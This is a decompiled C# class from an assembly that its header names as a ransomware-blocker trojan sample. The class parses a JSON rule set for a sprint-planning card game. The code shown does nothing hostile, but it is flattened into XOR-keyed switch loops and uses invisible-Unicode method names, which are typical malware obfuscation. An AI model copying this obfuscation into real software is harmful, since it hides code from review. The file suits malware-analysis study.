// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: Encod, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DCFB260-FACB-496A-9BC9-FA9701DCBF71
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-d5f77ba2b2ad58cfad5ae3111994ad0f889967e6d4f67ecb9cedf1b8f10a6149.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 1380515629;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1668345314)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1405120446 ^ 290478327;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -461770973 ^ 871796679;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = 930768776;
      int asInt;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 162120531)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 174270885 ^ 188436020;
            continue;
          case 3:
            asInt = json["max-impact"].AsInt;
            num1 = (int) num2 * -1821031977 ^ -605216148;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
      int aIndex = 0;
label_1:
      int num1 = -977040233;
      float[] riskChances;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -32525520)) % 8U)
        {
          case 0:
            int num3 = !flag ? -1810692678 : (num3 = -594287386);
            num1 = num3 ^ (int) num2 * -126814344;
            continue;
          case 1:
            flag = aIndex < numArray.Length;
            num1 = -1755496968;
            continue;
          case 2:
            riskChances = numArray;
            num1 = (int) num2 * -1816118780 ^ -904869924;
            continue;
          case 4:
            num1 = (int) num2 * -977298070 ^ -621210909;
            continue;
          case 5:
            goto label_1;
          case 6:
            numArray[aIndex] = json[aIndex].AsFloat;
            ++aIndex;
            num1 = -269671903;
            continue;
          case 7:
            num1 = (int) num2 * 260474136 ^ 1028429961;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
label_1:
      int num1 = 244010654;
      int aIndex1;
      bool flag1;
      int aIndex2;
      int num2;
      JSONNode jsonNode;
      List<Card> cardList;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 218444221)) % 25U)
        {
          case 0:
            num1 = (int) num3 * -1096755526 ^ 400820678;
            continue;
          case 1:
            bool flag2 = aIndex1 < maxImpact;
            cardList.Add(new Card()
            {
              Impact = flag2 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = 232231520;
            continue;
          case 2:
            int num4;
            num1 = num4 = num2 < jsonNode[aIndex1].AsInt ? 932733910 : (num4 = 1818633354);
            continue;
          case 3:
            array = cardList.ToArray();
            num1 = (int) num3 * 1854691262 ^ 43455072;
            continue;
          case 4:
            num1 = 1420659108;
            continue;
          case 5:
            ++aIndex1;
            num1 = (int) num3 * 1307258602 ^ 302460357;
            continue;
          case 6:
            num1 = 1620674781;
            continue;
          case 7:
            cardList = new List<Card>();
            num1 = (int) num3 * -122378013 ^ -773635744;
            continue;
          case 8:
            num1 = (int) num3 * -111804451 ^ 1516066735;
            continue;
          case 9:
            num1 = (int) num3 * 667013164 ^ 1916773098;
            continue;
          case 10:
            num1 = (int) num3 * 2035460801 ^ 776316743;
            continue;
          case 11:
            ++aIndex2;
            num1 = (int) num3 * -1061915105 ^ -1969961172;
            continue;
          case 12:
            num1 = (int) num3 * 961784305 ^ 1716174767;
            continue;
          case 13:
            int num5;
            num1 = num5 = aIndex2 < count ? 1068221278 : (num5 = 395149425);
            continue;
          case 14:
            goto label_1;
          case 16:
            num2 = 0;
            num1 = (int) num3 * -887514138 ^ -823812043;
            continue;
          case 17:
            aIndex2 = 0;
            num1 = (int) num3 * -1859461966 ^ -2133612489;
            continue;
          case 18:
            jsonNode = json[aIndex2];
            num1 = 238469102;
            continue;
          case 19:
            aIndex1 = 0;
            num1 = (int) num3 * 1438716666 ^ -1546768865;
            continue;
          case 20:
            int num6 = flag1 ? -386607934 : (num6 = -989311203);
            num1 = num6 ^ (int) num3 * -675557191;
            continue;
          case 21:
            ++num2;
            num1 = (int) num3 * -82930689 ^ 241399258;
            continue;
          case 22:
            num1 = (int) num3 * 276087369 ^ -1652964795;
            continue;
          case 23:
            flag1 = aIndex1 < maxImpact * 2;
            num1 = 1736604667;
            continue;
          case 24:
            num1 = (int) num3 * -774642937 ^ -2062269381;
            continue;
          default:
            goto label_26;
        }
      }
label_26:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1298889656;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -553782831)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = Rules.\u206A⁯‏‭‮‌‬⁯‭‪‎‮‏‭⁭‌‏⁬‬‭⁪⁪‪‬‪‏‫⁯⁬⁬⁫‍‍‏‪⁫​⁪‭‬‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -371224385 ^ 1941645433;
            continue;
          case 3:
            num1 = (int) num2 * -1886624668 ^ 92918227;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = -2042605104;
      int index;
      int num2;
      Card[] cards;
      Card card1;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -1236298383)) % 16U)
        {
          case 0:
            index = 0;
            num1 = (int) num3 * -287235264 ^ 173080883;
            continue;
          case 1:
            str1 = "[\n\t";
            num1 = (int) num3 * -545038324 ^ -1088836558;
            continue;
          case 2:
            num1 = (int) num3 * -1652388441 ^ -891645574;
            continue;
          case 3:
            ++index;
            num1 = (int) num3 * -249233610 ^ 1637668310;
            continue;
          case 4:
            str2 = Rules.\u200F‎‎⁪⁭‍‫‏⁮‏‌⁯‭​‎‍⁫‭‪‪​‮‮​‬‮‌⁯⁬‏‬‍‫‪⁮‬‍‫‭⁯‮(str1, "\n]");
            num1 = (int) num3 * 1420071098 ^ -942461214;
            continue;
          case 5:
            int num4;
            num1 = num4 = index >= cards.Length ? -1295526459 : (num4 = -451567283);
            continue;
          case 6:
            num1 = (int) num3 * 2104694836 ^ 1358323760;
            continue;
          case 7:
            str1 = Rules.\u200F‎‎⁪⁭‍‫‏⁮‏‌⁯‭​‎‍⁫‭‪‪​‮‮​‬‮‌⁯⁬‏‬‍‫‪⁮‬‍‫‭⁯‮(str1, "\n\t");
            num2 = card1.Type;
            num1 = (int) num3 * -198457395 ^ -1182952761;
            continue;
          case 8:
            int num5 = flag ? -201905554 : (num5 = -93100988);
            num1 = num5 ^ (int) num3 * -334762209;
            continue;
          case 9:
            flag = num2 != card1.Type;
            num1 = (int) num3 * 1766615639 ^ -1004013754;
            continue;
          case 10:
            cards = this.Cards;
            num1 = (int) num3 * 197832676 ^ 887278249;
            continue;
          case 12:
            card1 = cards[index];
            num1 = -708430441;
            continue;
          case 13:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206D⁮‎⁭‮‭‏‮⁫⁭​⁪‎⁫‏⁬‮⁯⁬‬⁪⁫⁭⁭‍‮⁫‮‎‍‎‎‫⁪⁮​⁭‬⁯⁪‮((object) card2) : (string) null;
            str1 = Rules.\u200D‫‍​‫⁮⁯⁯‭⁪‭‪‪‏⁬‍‮‍⁯‮‏‮‏‮‍‬‭‭⁮‬‭‬‫⁬⁮‪⁬‌‮⁬‮(str3, str4, " ");
            num1 = -1804325006;
            continue;
          case 14:
            goto label_1;
          case 15:
            num2 = 0;
            num1 = (int) num3 * -1881973754 ^ 1119777185;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u200F‎‎⁪⁭‍‫‏⁮‏‌⁯‭​‎‍⁫‭‪‪​‮‮​‬‮‌⁯⁬‏‬‍‫‪⁮‬‍‫‭⁯‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206C‬​‏⁬⁪⁪⁭‎⁫‫⁫⁪⁫‭⁬‭‬‏‪‭‏‪‫⁬‪⁫‌‬‌⁪⁫‪⁪‎‫⁭‍⁯⁭‮()));
      int index = 1;
label_1:
      int num1 = -1213350316;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -983425709)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            str1 = Rules.\u200D‫‍​‫⁮⁯⁯‭⁪‭‪‪‏⁬‍‮‍⁯‮‏‮‏‮‍‬‭‭⁮‬‭‬‫⁬⁮‪⁬‌‮⁬‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206C‬​‏⁬⁪⁪⁭‎⁫‫⁫⁪⁫‭⁬‭‬‏‪‭‏‪‫⁬‪⁫‌‬‌⁪⁫‪⁪‎‫⁭‍⁯⁭‮()));
            ++index;
            num1 = -335259108;
            continue;
          case 2:
            str2 = Rules.\u200F‎‎⁪⁭‍‫‏⁮‏‌⁯‭​‎‍⁫‭‪‪​‮‮​‬‮‌⁯⁬‏‬‍‫‪⁮‬‍‫‭⁯‮(str1, " ]");
            num1 = (int) num2 * -1535466419 ^ -498725756;
            continue;
          case 4:
            num1 = (int) num2 * 200117189 ^ -1110697089;
            continue;
          case 5:
            num1 = (int) num2 * -1249435441 ^ -400575186;
            continue;
          case 6:
            int num3;
            num1 = num3 = index >= this.RiskChances.Length ? -1861520694 : (num3 = -1856616619);
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return str2;
    }

    static string \u206A⁯‏‭‮‌‬⁯‭‪‎‮‏‭⁭‌‏⁬‬‭⁪⁪‪‬‪‏‫⁯⁬⁬⁫‍‍‏‪⁫​⁪‭‬‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200F‎‎⁪⁭‍‫‏⁮‏‌⁯‭​‎‍⁫‭‪‪​‮‮​‬‮‌⁯⁬‏‬‍‫‪⁮‬‍‫‭⁯‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206D⁮‎⁭‮‭‏‮⁫⁭​⁪‎⁫‏⁬‮⁯⁬‬⁪⁫⁭⁭‍‮⁫‮‎‍‎‎‫⁪⁮​⁭‬⁯⁪‮([In] object obj0) => obj0.ToString();

    static string \u200D‫‍​‫⁮⁯⁯‭⁪‭‪‪‏⁬‍‮‍⁯‮‏‮‏‮‍‬‭‭⁮‬‭‬‫⁬⁮‪⁬‌‮⁬‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206C‬​‏⁬⁪⁪⁭‎⁫‫⁫⁪⁫‭⁬‭‬‏‪‭‏‪‫⁬‪⁫‌‬‌⁪⁫‪⁪‎‫⁭‍⁯⁭‮() => CultureInfo.InvariantCulture;
  }
}
